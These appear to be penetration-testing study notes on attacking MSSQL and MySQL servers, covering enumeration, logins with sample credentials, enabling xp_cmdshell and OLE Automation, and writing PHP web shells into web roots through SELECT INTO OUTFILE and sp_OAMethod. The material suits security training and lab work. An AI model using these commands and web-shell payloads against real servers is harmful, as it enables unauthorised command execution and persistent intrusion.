### Enumeration
##### Ports
*MSSQL:* TCP/1433 | UDP/1434
*MySQL:* TCP/3306

#### Banner Grabbing
```shell-session
nmap -Pn -sV -sC -p1433 10.10.10.125
```

### Authentication Mechanisms
MSSQL:

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|
MySQL:
[Full list](https://dev.mysql.com/doc/internals/en/authentication-method.html)

1. Username and password
2. Windows authentication (requires plugin)

### Connecting
#### MySQL
##### mysql
```shell-session
mysql -u julio -p Password123 -h 10.129.20.13
```

##### sqlcmd
```cmd-session
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

*`-y` and `-Y` are for better looking output, although this might effect performance.*

#### MSSQL
##### sqsh
```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
*`-h` is used to disable headers.*

##### impacket-mssqlclient.py
```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7 
```

##### Windows Authentication
Add `SERVERNAME\\accountname` or `.\\accountname`

```shell-session
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

#### Default Databases
##### MySQL
- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

##### MSSQL
- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

#### Syntax
##### Show Databases
MySQL:
```shell-session
mysql> SHOW DATABASES;
```

sqlcmd:
```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

##### Select a Database
mysql:
```shell-session
mysql> USE htbusers;
```

sqlcmd:
```cmd-session
1> USE htbusers
2> GO
```

##### Show Tables
mysql:
```shell-session
mysql> SHOW TABLES;
```

sqlcmd:
```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```

##### Select all Data from Table
mysql:
```shell-session
mysql> SELECT * FROM users;
```

sqlcmd:
```cmd-session
1> SELECT * FROM users
2> go
```

### Execute Commands
#### MSSQL

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account

- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

If `xp_cmdshell` is not enabled, we can enable it (with the right permissions):
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

##### To use:
```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```

#### MySQL
  If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory(either php or ASP.NET).

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

- [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) effects data import and export operations like `LOAD DATA`, `SELECT ... INTO OUTFILE`, and `LOAD_FILE()` - limited to users with the `FILE` permission.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

If the variable is empty, we can read and write data:
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

#### MSSQL - Enable Ole Automation Procedures
**Needs administrator**

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File
**Needs administrator**

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

